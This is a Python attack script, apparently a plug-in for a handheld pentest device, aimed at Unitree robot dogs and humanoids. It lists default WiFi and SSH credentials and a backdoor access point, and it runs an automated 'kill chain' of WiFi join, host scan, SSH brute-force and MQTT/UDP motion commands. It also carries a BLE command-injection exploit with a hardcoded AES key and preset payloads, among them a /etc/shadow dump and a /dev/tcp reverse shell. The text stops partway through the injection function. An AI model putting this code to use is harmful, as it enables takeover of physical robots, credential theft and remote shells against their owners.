#!/usr/bin/env python3
# @active: true
# @web: true
# @name: Unitree Robot Security Tester
# @desc: Security testing tool for Unitree robots (Go1, Go2, B2, H1, G1).
# @category: wifi
# @danger: true
# @inputs: [{"name":"mode","label":"Authorized Unitree assessment operation","type":"select","choices":[{"value":"recon","label":"Reconnaissance — collect passive/local robot and network information"},{"value":"scan","label":"Network scan — probe the authorized robot for exposed services"},{"value":"ble-scan","label":"Bluetooth scan — search nearby BLE advertisements for Unitree devices"},{"value":"autopwn","label":"Automated active test — run the payload's full authorized exploitation workflow"}],"default":"recon"},{"name":"seconds","label":"Bluetooth scan duration in seconds (BLE scan mode only)","type":"number","default":"8"}]

import os
import sys
import time
import signal
import socket
import struct
import subprocess
import json
import asyncio
import threading
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_interfaces
from payloads._web_input import request_input

# BLE UniPwn (CVE-2025-35027) — optional deps
try:
    from bleak import BleakClient, BleakScanner
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    BLE_OK = True
except ImportError:
    BLE_OK = False


LOOT_DIR = os.path.join(os.environ["CITYPOP_LOOT"], "Unitree")

_running = True


def _cleanup(*_):
    global _running
    _running = False


signal.signal(signal.SIGINT, _cleanup)
signal.signal(signal.SIGTERM, _cleanup)

# ---------------------------------------------------------------------------
# Unitree known data — verified against published research & SDK
# ---------------------------------------------------------------------------

# WiFi SSID patterns (from official manuals + Go2 docs)
UNITREE_SSID_PATTERNS = [
    "UnitreeRoboticsGO1",   # Go1 official: "UnitreeRoboticsGO1-XXX"
    "Unitree_Go",           # Go2 format: "Unitree_GoXXXXXXX"
    "Unitree_B",            # B2
    "Unitree_H",            # H1
    "Unitree_G1",           # G1
]

# WiFi default password (from official Go1 User Manual + Go2 docs)
DEFAULT_WIFI_PASSWORDS = [
    "00000000",     # Documented default for Go1 and Go2 (8 zeros)
    "12345678",     # Common alternate
]

# WiFi backdoor (from MAVProxyUser/YushuTechUnitreeGo1)
# The Go1 RPi wpa_supplicant.conf has hardcoded WiFi credentials ENABLED by default
# Creating an AP with this SSID+password makes the robot's Pi auto-connect to it
WIFI_BACKDOOR_SSID = "Unitree-2.4G"
WIFI_BACKDOOR_PWD = "Unitree#9035"

# SSH credentials (verified from Trossenrobotics docs + MAVProxyUser research)
# unitree/123 → all Nanos (.13, .14, .15, Go2 .18)
# pi/123      → Raspberry Pi (.161) and WiFi gateway (.12.1)
# root/123    → RPi (enabled by default on Go1)
# root/theroboverse → Go2/G1 after FreeBOT jailbreak (fw 1.0.19-1.1.7)
DEFAULT_CREDS = [
    ("unitree", "123"),
    ("pi", "123"),
    ("root", "123"),
    ("root", "theroboverse"),
]

# Internal network (from Unitree Go1 EDU Architecture + Go2 docs)
# .10 = MCU motion controller (no SSH, low-level UDP only)
# .161 = Raspberry Pi (high-level UDP target + SSH)
UNITREE_SSH_TARGETS = [
    ("192.168.12.1", "WiFi Gateway", ["pi"]),
    ("192.168.123.13", "Head Nano", ["unitree"]),
    ("192.168.123.14", "Body Nano", ["unitree"]),
    ("192.168.123.15", "Jetson NX", ["unitree"]),
    ("192.168.123.18", "Go2 EDU", ["unitree"]),
    ("192.168.123.161", "Raspberry Pi", ["pi", "root"]),
]

# All IPs to scan (including non-SSH targets)
UNITREE_ALL_IPS = [
    ("192.168.12.1", "WiFi GW"),
    ("192.168.123.10", "MCU"),
    ("192.168.123.13", "Head"),
    ("192.168.123.14", "Body"),
    ("192.168.123.15", "NX"),
    ("192.168.123.18", "Go2"),
    ("192.168.123.161", "RPi"),
]

PORTS_TO_CHECK = [
    (22, "SSH"),
    (80, "HTTP/WS"),
    (1883, "MQTT"),
    (4001, "Camera"),
    (8007, "LowCtrl"),
    (8082, "HighCtrl"),
    (8090, "State"),
    (9090, "ROS"),
    (9800, "Upload"),
    (9991, "WebRTC"),
]

# UDP high-level control (from unitree_legged_sdk udp.h + example_walk.cpp)
# Target: Raspberry Pi at 192.168.123.161, port 8082
UDP_HIGH_PORT = 8082
UDP_HIGH_IP = "192.168.123.161"

# MQTT control (from MAVProxyUser research + go1pylib)
# Broker at 192.168.12.1:1883 (WiFi gateway RPi)
# Topic: "controller/action", messages: standUp, standDown, walk, run, climb
MQTT_BROKER_IP = "192.168.12.1"
MQTT_BROKER_PORT = 1883
MQTT_TOPIC = "controller/action"
MQTT_COMMANDS = {
    "stand": "standUp",
    "sit": "standDown",
    "recover": "recoverStand",
    "walk": "walk",
    "run": "run",
    "climb": "climb",
    "damping": "damping",
    "dance1": "dance1",
    "dance2": "dance2",
    "backflip": "backflip",
}

# RCE topics (from MAVProxyUser + go1pylib source)
MQTT_RCE_TOPIC = "programming/code"
MQTT_SHELL_TOPIC = "usys/sh"

# ---------------------------------------------------------------------------
# BLE UniPwn constants (CVE-2025-35027)
# From Bin4ry/UniPwn GitHub + arXiv 2509.14139
# Affects: Go2, B2, G1, H1 (NOT Go1)
# ---------------------------------------------------------------------------
BLE_SERVICE_UUID = "0000ffe0-0000-1000-8000-00805f9b34fb"
BLE_WRITE_CHAR = "0000ffe2-0000-1000-8000-00805f9b34fb"
BLE_NOTIFY_CHAR = "0000ffe1-0000-1000-8000-00805f9b34fb"
BLE_AES_KEY = bytes.fromhex("df98b715d5c6ed2b25817b6f2554124a")
BLE_AES_IV = bytes.fromhex("2841ae97419c2973296a0d4bdfe19a4f")
BLE_AUTH_STRING = "unitree"

# Preset injection payloads
BLE_PAYLOADS = [
    ("Enable SSH root", 'sed -i "s/#PermitRootLogin/PermitRootLogin yes/" /etc/ssh/sshd_config && echo root:pwned | chpasswd && systemctl restart sshd'),
    ("Reboot robot", "reboot -f"),
    ("Dump /etc/shadow", "cat /etc/shadow > /tmp/loot.txt"),
    ("Reverse shell 4444", "bash -i >& /dev/tcp/{LHOST}/4444 0>&1"),
    ("Stop all services", "systemctl stop unitree-*"),
]

# ---------------------------------------------------------------------------
# HighCmd builder — 129 bytes, #pragma pack(1)
# Offsets verified from unitree_legged_sdk/include/comm.h (go1 branch)
#
# Offset  Field              Type        Size
# 0       head               uint8[2]    2    → 0xFE, 0xEF
# 2       levelFlag          uint8       1    → 0x00 (high-level)
# 3       frameReserve       uint8       1
# 4       SN                 uint32[2]   8
# 12      version            uint32[2]   8
# 20      bandWidth          uint16      2
# 22      mode               uint8       1
# 23      gaitType           uint8       1
# 24      speedLevel         uint8       1
# 25      footRaiseHeight    float32     4
# 29      bodyHeight         float32     4
# 33      position           float32[2]  8
# 41      euler              float32[3]  12
# 53      velocity           float32[2]  8    → [0]=vx, [1]=vy
# 61      yawSpeed           float32     4
# 65      bms (BmsCmd)       4 bytes     4
# 69      led (LED[4])       3*4 bytes   12
# 81      wirelessRemote     uint8[40]   40
# 121     reserve            uint32      4
# 125     crc                uint32      4
#                                      = 129 bytes total
# ---------------------------------------------------------------------------

HIGHCMD_SIZE = 129

# Offsets
_OFF_HEAD = 0
_OFF_LEVEL = 2
_OFF_MODE = 22
_OFF_GAIT = 23
_OFF_SPEED_LVL = 24
_OFF_FOOT_H = 25
_OFF_BODY_H = 29
_OFF_VX = 53       # velocity[0]
_OFF_VY = 57       # velocity[1]
_OFF_YAW = 61

# Mode values (from SDK example_walk.cpp)
MODE_IDLE = 0           # idle, default stand
MODE_FORCE_STAND = 1    # forced stand, euler adjustable
MODE_WALK = 2           # walk continuously
MODE_STAND_DOWN = 5
MODE_STAND_UP = 6

# Gait types
GAIT_IDLE = 0
GAIT_TROT = 1
GAIT_TROT_RUN = 2
GAIT_CLIMB = 3


def _build_high_cmd(mode=0, gait=0, vx=0.0, vy=0.0, yaw=0.0,
                    foot_h=0.08, body_h=0.0):
    """Build a Go1/Go2 HighCmd UDP packet (129 bytes).

    Struct layout verified against unitree_legged_sdk comm.h (go1 branch).
    """
    cmd = bytearray(HIGHCMD_SIZE)
    # Header
    cmd[_OFF_HEAD] = 0xFE
    cmd[_OFF_HEAD + 1] = 0xEF
    # Level flag: 0x00 = high-level
    cmd[_OFF_LEVEL] = 0x00
    # Control fields
    cmd[_OFF_MODE] = mode & 0xFF
    cmd[_OFF_GAIT] = gait & 0xFF
    struct.pack_into("<f", cmd, _OFF_FOOT_H, foot_h)
    struct.pack_into("<f", cmd, _OFF_BODY_H, body_h)
    struct.pack_into("<f", cmd, _OFF_VX, vx)
    struct.pack_into("<f", cmd, _OFF_VY, vy)
    struct.pack_into("<f", cmd, _OFF_YAW, yaw)
    return bytes(cmd)


def _cmd_idle():
    return _build_high_cmd(mode=MODE_IDLE)

def _cmd_stand():
    return _build_high_cmd(mode=MODE_FORCE_STAND)

def _cmd_walk(vx=0.0, vy=0.0, yaw=0.0):
    return _build_high_cmd(mode=MODE_WALK, gait=GAIT_TROT,
                           vx=vx, vy=vy, yaw=yaw, foot_h=0.08)

def _cmd_walk_fast(vx=0.0, vy=0.0, yaw=0.0):
    return _build_high_cmd(mode=MODE_WALK, gait=GAIT_TROT_RUN,
                           vx=vx, vy=vy, yaw=yaw, foot_h=0.1)

def _cmd_stand_down():
    return _build_high_cmd(mode=MODE_STAND_DOWN)

def _cmd_stand_up():
    return _build_high_cmd(mode=MODE_STAND_UP)


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def scan_unitree_wifi(iface):
    """Scan for Unitree robot WiFi networks."""
    try:
        subprocess.run(["nmcli", "device", "wifi", "rescan", "ifname", iface],
                       capture_output=True, timeout=10)
        time.sleep(2)
        result = subprocess.run(
            ["nmcli", "-t", "-f", "BSSID,SSID,SIGNAL,SECURITY", "device", "wifi", "list",
             "ifname", iface],
            capture_output=True, text=True, timeout=10,
        )
        networks = []
        for line in result.stdout.strip().split("\n"):
            if not line.strip():
                continue
            parts = line.replace("\\:", "#").split(":")
            if len(parts) < 4:
                continue
            bssid = parts[0].replace("#", ":")
            ssid = parts[1].replace("#", ":")
            try:
                sig = int(parts[2])
            except ValueError:
                sig = 0
            security = parts[3].replace("#", ":") if len(parts) > 3 else ""
            is_unitree = any(pat.lower() in ssid.lower() for pat in UNITREE_SSID_PATTERNS)
            networks.append({
                "bssid": bssid, "ssid": ssid, "signal": sig,
                "security": security, "unitree": is_unitree,
            })
        networks.sort(key=lambda n: (not n["unitree"], -n["signal"]))
        return networks
    except Exception:
        return []


def connect_wifi(iface, ssid, password=None):
    cmd = ["nmcli", "device", "wifi", "connect", ssid, "ifname", iface]
    if password:
        cmd += ["password", password]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return r.returncode == 0
    except Exception:
        return False


def get_local_ip(iface):
    """Get our IP after connecting to the robot's WiFi."""
    try:
        r = subprocess.run(["ip", "-4", "-o", "addr", "show", iface],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.split("\n"):
            if "inet " in line:
                return line.split("inet ")[1].split("/")[0]
    except Exception:
        pass
    return None


def check_port(ip, port, timeout=1.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except Exception:
        return False


def check_host_alive(ip, timeout=1):
    try:
        r = subprocess.run(["ping", "-c", "1", "-W", str(timeout), ip],
                           capture_output=True, timeout=timeout + 1)
        return r.returncode == 0
    except Exception:
        return False


def discover_services(callback=None):
    results = []
    for ip, desc in UNITREE_ALL_IPS:
        if not _running:
            break
        if callback:
            callback(f"Ping {ip}...")
        if not check_host_alive(ip, timeout=1):
            continue
        host = {"ip": ip, "desc": desc, "alive": True, "ports": []}
        for port, svc in PORTS_TO_CHECK:
            if not _running:
                break
            if check_port(ip, port, timeout=1):
                host["ports"].append((port, svc))
        results.append(host)
        if callback:
            callback(f"Found {ip}")
    return results


def test_ssh_cred(ip, username, password, timeout=5):
    try:
        cmd = ["sshpass", "-p", password,
               "ssh", "-o", "StrictHostKeyChecking=no",
               "-o", "ConnectTimeout=3",
               "-o", "UserKnownHostsFile=/dev/null",
               f"{username}@{ip}", "echo PWNED"]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return "PWNED" in r.stdout
    except Exception:
        return False


def send_udp_cmd(ip, port, data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.sendto(data, (ip, port))
        s.close()
        return True
    except Exception:
        return False


def send_mqtt_cmd(action):
    """Send MQTT mode command to the Go1 robot.

    Uses mosquitto_pub CLI.
    Broker: 192.168.12.1:1883, Topic: controller/action
    Verified: go1pylib source code, MAVProxyUser research, academic papers.
    """
    msg = MQTT_COMMANDS.get(action, action)
    try:
        r = subprocess.run(
            ["mosquitto_pub", "-h", MQTT_BROKER_IP, "-p", str(MQTT_BROKER_PORT),
             "-t", MQTT_TOPIC, "-m", msg, "-q", "2"],
            capture_output=True, text=True, timeout=5,
        )
        return r.returncode == 0
    except Exception:
        return False


def send_mqtt_stick(lx=0.0, rx=0.0, ry=0.0, ly=0.0):
    """Send joystick movement command via MQTT.

    Topic: controller/stick
    Payload: 4x float32 little-endian (16 bytes)
      [0] lx = strafe left(-) / right(+)
      [1] rx = turn left(-) / right(+)
      [2] ry = look down(+) / up(-)    (stand mode only)
      [3] ly = backward(-) / forward(+)

    Values: -1.0 to +1.0
    Rate: should be sent at 10Hz (100ms) for continuous movement

    Verified: go1pylib/mqtt/client.py + YushuTech paho_dump.py + go1-js
    """
    payload = struct.pack("<ffff", lx, rx, ry, ly)
    try:
        # mosquitto_pub can't send raw bytes easily, use Python socket instead
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((MQTT_BROKER_IP, MQTT_BROKER_PORT))
        # MQTT CONNECT packet (minimal, protocol 3.1.1)
        connect = bytearray([
            0x10,  # CONNECT
            0x0E,  # remaining length
            0x00, 0x04, 0x4D, 0x51, 0x54, 0x54,  # "MQTT"
            0x04,  # protocol level 4 (3.1.1)
            0x02,  # clean session
            0x00, 0x3C,  # keepalive 60s
            0x00, 0x02, 0x52, 0x4A,  # client ID "RJ"
        ])
        s.send(connect)
        s.recv(4)  # CONNACK
        # MQTT PUBLISH to controller/stick
        topic = b"controller/stick"
        topic_len = struct.pack(">H", len(topic))
        pub_payload = topic_len + topic + payload
        pub_header = bytearray([0x30, len(pub_payload)])  # PUBLISH QoS0
        s.send(pub_header + pub_payload)
        # DISCONNECT
        s.send(bytearray([0xE0, 0x00]))
        s.close()
        return True
    except Exception:
        return False


def save_loot(data, prefix="unitree"):
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"{prefix}_{ts}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    return path


# ---------------------------------------------------------------------------
# Automated Kill Chain
# ---------------------------------------------------------------------------

def auto_pwn(lcd, iface):
    """Full automated kill chain: detect → connect → recon → creds → control."""
    report = {
        "timestamp": datetime.now().isoformat(),
        "iface": iface,
        "steps": [],
    }

    def _step(msg, detail=""):
        print(f"{msg} {detail}".strip(), flush=True)
        report["steps"].append({"action": msg, "detail": detail,
                                "time": datetime.now().isoformat()})

    # Step 1: Scan WiFi
    _step("1/6 Scanning WiFi...")
    networks = scan_unitree_wifi(iface)
    unitree_nets = [n for n in networks if n["unitree"]]
    if not unitree_nets:
        _step("FAILED", "No Unitree AP found")
        report["result"] = "no_target"
        save_loot(report, "autopwn")
        time.sleep(3)
        return report
    target_ssid = unitree_nets[0]["ssid"]
    _step("1/6 Found target", target_ssid[:18])
    time.sleep(1)

    # Step 2: Connect WiFi
    _step("2/6 Connecting...", target_ssid[:18])
    connected = False
    used_pwd = ""
    for pwd in DEFAULT_WIFI_PASSWORDS:
        if not _running:
            break
        _step("2/6 Trying pwd", pwd)
        if connect_wifi(iface, target_ssid, pwd):
            connected = True
            used_pwd = pwd
            break
    if not connected:
        # Try open network
        if connect_wifi(iface, target_ssid):
            connected = True
            used_pwd = "(open)"
    if not connected:
        _step("FAILED", "Cannot connect")
        report["result"] = "wifi_failed"
        save_loot(report, "autopwn")
        time.sleep(3)
        return report
    report["wifi"] = {"ssid": target_ssid, "password": used_pwd}
    _step("2/6 Connected!", f"pwd: {used_pwd}")
    time.sleep(2)

    # Step 3: Wait for IP
    _step("3/6 Getting IP...")
    local_ip = None
    for _ in range(10):
        if not _running:
            break
        local_ip = get_local_ip(iface)
        if local_ip:
            break
        time.sleep(1)
    report["local_ip"] = local_ip
    _step("3/6 IP obtained", local_ip or "DHCP failed")
    time.sleep(1)

    # Step 4: Recon
    _step("4/6 Scanning hosts...")
    services = discover_services(
        callback=lambda msg: _step("4/6 " + msg[:16]))
    report["services"] = services
    alive = [s for s in services if s["alive"]]
    _step("4/6 Recon done", f"{len(alive)} hosts found")
    time.sleep(1)

    # Step 5: SSH brute-force
    _step("5/6 Testing creds...")
    cred_results = []
    for ip, desc, expected_users in UNITREE_SSH_TARGETS:
        if not _running:
            break
        if not check_host_alive(ip, timeout=1):
            continue
        for user, pwd in DEFAULT_CREDS:
            if not _running:
                break
            # Only try expected users for this host
            if user not in expected_users and user != "root":
                continue
            _step("5/6 SSH", f"{ip} {user}:{pwd}")
            success = test_ssh_cred(ip, user, pwd)
            cred_results.append({
                "ip": ip, "desc": desc, "user": user,
                "pwd": pwd, "success": success,
            })
            if success:
                break
    report["credentials"] = cred_results
    pwned = sum(1 for r in cred_results if r["success"])
    _step("5/6 Creds done", f"{pwned} hosts pwned")
    time.sleep(1)

    # Step 6: Proof of control — make it stand via MQTT + UDP
    _step("6/6 Sending stand...")
    mqtt_ok = send_mqtt_cmd("stand")
    udp_ok = send_udp_cmd(UDP_HIGH_IP, UDP_HIGH_PORT, _cmd_stand())
    report["control"] = {"mqtt_sent": mqtt_ok, "udp_sent": udp_ok,
                         "mqtt_target": MQTT_BROKER_IP, "udp_target": UDP_HIGH_IP}
    if mqtt_ok or udp_ok:
        method = "MQTT" if mqtt_ok else "UDP"
        _step(f"6/6 STAND via {method}!", "Switching to gamepad...")
        time.sleep(2)
        # Don't sit — keep standing for gamepad control
    else:
        _step("6/6 Control failed", "No MQTT or UDP")

    # Save report
    report["result"] = "success" if pwned > 0 else "partial"
    path = save_loot(report, "autopwn")
    _step("DONE!", f"Pwned:{pwned} Saved")
    time.sleep(3)
    return report


# ---------------------------------------------------------------------------
# LCD Drawing
# ---------------------------------------------------------------------------

def draw_splash(lcd, msg, sub=""):
    w, h = lcd.width, lcd.height
    img = Image.new("RGB", (w, h), "black")
    d = ScaledDraw(img)
    d.rectangle((0, 0, 127, 13), fill="#220000")
    d.text((2, 1), "UNITREE PWN", font=FONT_BIG, fill="#FF4444")
    d.text((10, 45), msg[:22], font=FONT, fill="#FFAA00")
    if sub:
        d.text((10, 60), sub[:22], font=FONT_SM, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


def draw_scan(lcd, networks, cursor, scroll, iface):
    w, h = lcd.width, lcd.height
    img = Image.new("RGB", (w, h), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#220000")
    d.text((2, 1), "SCAN", font=FONT_BIG, fill="#FF4444")
    found = sum(1 for n in networks if n["unitree"])
    d.text((40, 2), f"Unitree:{found}", font=FONT_SM, fill="#FF8800" if found else "#555")
    d.text((100, 2), iface[:6], font=FONT_SM, fill="#888")

    visible = networks[scroll:scroll + 7]
    for i, net in enumerate(visible):
        y = 15 + i * 14
        idx = scroll + i
        prefix = ">" if idx == cursor else " "
        ssid = net["ssid"][:11] or "Hidden"
        if net["unitree"]:
            color = "#FF4444" if idx == cursor else "#FF8800"
        else:
            color = "#00FF00" if idx == cursor else "#666"
        d.text((2, y), f"{prefix}{ssid}", font=FONT, fill=color)
        d.text((82, y), f"{net['signal']}%", font=FONT_SM, fill="#888")
        lock = "L" if net["security"] else "O"
        d.text((108, y), lock, font=FONT_SM,
               fill="#FFAA00" if net["security"] else "#00FF00")

    if not networks:
        d.text((10, 35), "No networks found", font=FONT, fill="#666")
        d.text((10, 50), "OK to scan", font=FONT_SM, fill="#888")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:Scan K1:Con K2:BLE", font=FONT_SM, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


def draw_recon(lcd, services, status, scroll):
    w, h = lcd.width, lcd.height
    img = Image.new("RGB", (w, h), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#220000")
    d.text((2, 1), "RECON", font=FONT_BIG, fill="#FF4444")
    hosts = sum(1 for s in services if s["alive"])
    d.text((50, 2), f"Hosts:{hosts}", font=FONT_SM, fill="#00FF00" if hosts else "#555")

    lines = []
    for svc in services:
        lines.append({"t": f"{svc['ip']} {svc['desc'][:6]}", "c": "#FFAA00"})
        for port, name in svc["ports"]:
            lines.append({"t": f"  :{port} {name}", "c": "#00FF00"})

    visible = lines[scroll:scroll + 7]
    for i, ln in enumerate(visible):
        d.text((2, 16 + i * 13), ln["t"][:22], font=FONT, fill=ln["c"])

    if not services:
        d.text((10, 30), status[:22], font=FONT, fill="#888")
        d.text((10, 48), "Connect to robot WiFi", font=FONT_SM, fill="#666")
        d.text((10, 60), "then OK to scan", font=FONT_SM, fill="#666")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:Scan K2:Save K3:X", font=FONT_SM, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)
    return len(lines)


def draw_ctrl(lcd, status, last_cmd):
    w, h = lcd.width, lcd.height
    img = Image.new("RGB", (w, h), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#220000")
    d.text((2, 1), "CONTROL", font=FONT_BIG, fill="#FF4444")
    d.text((65, 2), status[:10], font=FONT_SM,
           fill="#00FF00" if status == "Active" else "#888")

    y = 17
    d.text((4, y), f"MQTT {MQTT_BROKER_IP}:1883", font=FONT_SM, fill="#00FF00")
    y += 10
    d.text((4, y), f"UDP  {UDP_HIGH_IP}:8082", font=FONT_SM, fill="#888")
    y += 10
    d.text((4, y), f"{last_cmd[:20]}", font=FONT_SM, fill="#58a6ff")
    y += 13

    # D-pad visual
    cx, cy = 64, 75
    d.text((cx - 3, cy - 18), "FWD", font=FONT_SM, fill="#00FF00")
    d.text((cx - 3, cy + 12), "BWD", font=FONT_SM, fill="#00FF00")
    d.text((cx - 28, cy - 3), "L", font=FONT_SM, fill="#00FF00")
    d.text((cx + 20, cy - 3), "R", font=FONT_SM, fill="#00FF00")
    d.rectangle((cx - 5, cy - 5, cx + 5, cy + 5), fill="#333", outline="#666")
    d.text((cx - 3, cy - 3), "OK", font=FONT_SM, fill="#FFF")

    d.text((4, 98), "OK:Stand K1:Sit", font=FONT_SM, fill="#CCC")

    d.rectangle((0, 116, 127, 127), fill="#440000")
    d.text((2, 117), "K2:EMERGENCY STOP", font=FONT_SM, fill="#FF0000")
    lcd.LCD_ShowImage(img, 0, 0)


def draw_creds(lcd, results, status, scroll):
    w, h = lcd.width, lcd.height
    img = Image.new("RGB", (w, h), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#220000")
    d.text((2, 1), "CREDS", font=FONT_BIG, fill="#FF4444")
    cracked = sum(1 for r in results if r.get("success"))
    if cracked:
        d.text((50, 2), f"PWNED:{cracked}", font=FONT_SM, fill="#00FF00")

    d.text((2, 16), status[:22], font=FONT, fill="#FFAA00")

    visible = results[scroll:scroll + 6]
    for i, r in enumerate(visible):
        y = 30 + i * 13
        ip_short = r["ip"].split(".")[-1]
        cred = f"{r['user']}:{r['pwd']}"
        if r.get("success"):
            d.text((2, y), f"*.{ip_short} {cred}", font=FONT, fill="#00FF00")
        else:
            d.text((2, y), f" .{ip_short} {cred}", font=FONT, fill="#664444")

    if not results:
        d.text((10, 40), "OK to start testing", font=FONT, fill="#666")
        d.text((10, 55), "unitree/123 (Nanos)", font=FONT_SM, fill="#888")
        d.text((10, 66), "pi/123 (RPi+GW)", font=FONT_SM, fill="#888")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:Test K2:Save K3:X", font=FONT_SM, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)
    return len(results)


def draw_autopwn(lcd, report):
    w, h = lcd.width, lcd.height
    img = Image.new("RGB", (w, h), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#440000")
    d.text((2, 1), "AUTO PWN", font=FONT_BIG, fill="#FF0000")

    if not report:
        d.text((10, 30), "Full automated", font=FONT, fill="#FFAA00")
        d.text((10, 44), "kill chain:", font=FONT, fill="#FFAA00")
        d.text((6, 58), "1. Scan Unitree WiFi", font=FONT_SM, fill="#CCC")
        d.text((6, 68), "2. Connect (00000000)", font=FONT_SM, fill="#CCC")
        d.text((6, 78), "3. Recon 192.168.123.*", font=FONT_SM, fill="#CCC")
        d.text((6, 88), "4. SSH brute-force", font=FONT_SM, fill="#CCC")
        d.text((6, 98), "5. MQTT+UDP stand cmd", font=FONT_SM, fill="#CCC")
        d.text((6, 108), "6. Switch to gamepad", font=FONT_SM, fill="#CCC")
    else:
        y = 16
        result = report.get("result", "?")
        color = "#00FF00" if result == "success" else "#FFAA00" if result == "partial" else "#FF4444"
        d.text((2, y), f"Result: {result}", font=FONT, fill=color)
        y += 13
        wifi = report.get("wifi", {})
        if wifi:
            d.text((2, y), f"WiFi: {wifi.get('ssid', '?')[:14]}", font=FONT_SM, fill="#00FF00")
            y += 10
        creds = report.get("credentials", [])
        pwned = [c for c in creds if c.get("success")]
        d.text((2, y), f"Hosts pwned: {len(pwned)}", font=FONT_SM, fill="#00FF00" if pwned else "#FF4444")
        y += 10
        for c in pwned[:3]:
            d.text((6, y), f"{c['ip']} {c['user']}:{c['pwd']}", font=FONT_SM, fill="#00FF00")
            y += 10
        ctrl = report.get("control", {})
        if ctrl.get("mqtt_sent") or ctrl.get("udp_sent"):
            methods = []
            if ctrl.get("mqtt_sent"):
                methods.append("MQTT")
            if ctrl.get("udp_sent"):
                methods.append("UDP")
            d.text((2, y), f"Control: {'+'.join(methods)}", font=FONT_SM, fill="#00FF00")
        y += 12
        d.text((2, y), f"Saved to loot/Unitree", font=FONT_SM, fill="#555")

    d.rectangle((0, 116, 127, 127), fill="#440000")
    d.text((2, 117), "OK:Start K3:Back", font=FONT_SM, fill="#FF0000")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# BLE UniPwn functions (CVE-2025-35027)
# ---------------------------------------------------------------------------

def _ble_encrypt(data):
    """AES-CFB128 encrypt for Unitree BLE protocol."""
    if isinstance(data, str):
        data = data.encode()
    cipher = Cipher(algorithms.AES(BLE_AES_KEY), modes.CFB(BLE_AES_IV))
    return cipher.encryptor().update(data)


def _ble_decrypt(data):
    """AES-CFB128 decrypt for Unitree BLE protocol."""
    cipher = Cipher(algorithms.AES(BLE_AES_KEY), modes.CFB(BLE_AES_IV))
    return cipher.decryptor().update(data)


def ble_scan_unitree(timeout=8):
    """Scan for Unitree robots via BLE (Go2/G1/H1/B2).

    Looks for devices advertising the Unitree BLE service UUID.
    """
    if not BLE_OK:
        return []

    found = []

    async def _scan():
        devices = await BleakScanner.discover(timeout=timeout)
        for d in devices:
            # Check if device has Unitree service UUID
            uuids = [str(u).lower() for u in (d.metadata.get("uuids", []) or [])]
            name = d.name or ""
            is_unitree = (
                BLE_SERVICE_UUID in uuids
                or "unitree" in name.lower()
                or "go2" in name.lower()
                or name.lower().startswith("g1")
                or name.lower().startswith("h1")
                or name.lower().startswith("b2")
            )
            if is_unitree:
                found.append({
                    "name": name or "Unknown",
                    "mac": d.address,
                    "rssi": d.rssi or 0,
                })

    try:
        asyncio.run(_scan())
    except Exception:
        pass
    found.sort(key=lambda d: -d["rssi"])
    return found


def ble_exploit_unitree(mac, payload_cmd, lcd=None, callback=None):
    """Execute UniPwn BLE exploit on a Unitree robot.

    Steps (from Bin4ry/UniPwn):
    1. Connect via BLE GATT
    2. Subscribe to notify characteristic
    3. Send encrypted auth string "unitree"
    4. Send get_sn to verify access
    5. Initialize WiFi mode
    6. Inject command via SSID/password field
    7. Trigger via country code change (restarts hostapd)

    Returns dict with results.
    """
    if not BLE_OK:
        return {"success": False, "error": "bleak not installed"}

    result = {"success": False, "mac": mac, "sn": "", "error": ""}
    _notify_data = []

    def _step(msg):
        if callback:
            callback(msg)

    async def _exploit():
        _step("Connecting BLE...")
        try:
            async with BleakClient(mac, timeout=15) as client:
                if not client.is_connected:
                    result["error"] = "Connection failed"
                    return

                # Subscribe to notifications
                async def _on_notify(sender, data):
                    decrypted = _ble_decrypt(data)
                    _notify_data.append(decrypted)

                await client.start_notify(BLE_NOTIFY_CHAR, _on_notify)
                _step("Connected. Auth...")

                # Step 1: Send auth
                auth_enc = _ble_encrypt(BLE_AUTH_STRING)
                await client.write_gatt_char(BLE_WRITE_CHAR, auth_enc)
                await asyncio.sleep(1)

                # Step 2: Get serial number
                _step("Getting SN...")
                _notify_data.clear()
                get_sn_enc = _ble_encrypt("get_sn")
                await client.write_gatt_char(BLE_WRITE_CHAR, get_sn_enc)
                await asyncio.sleep(2)

                if _notify_data:
                    sn_raw = b"".join(_notify_data)
                    try:
                        result["sn"] = sn_raw.decode(errors="replace").strip()
                    except Exception:
                        result["sn"] = sn_raw.hex()
                _step(f"SN: {result['sn'][:20]}")

                # Step 3: Init WiFi AP mode
                _step("Init WiFi mode...")
                init_cmd = _ble_encrypt("init_wifi_ap")
                await client.write_gatt_char(BLE_WRITE_CHAR, init_cmd)
                await asyncio.sleep(1)

                # Step 4: Inject command via SSID field
                # The vulnerable function passes SSID to system() unsanitized
                injection = f'";$({payload_cmd});#'
                _step(f"Injecting...")
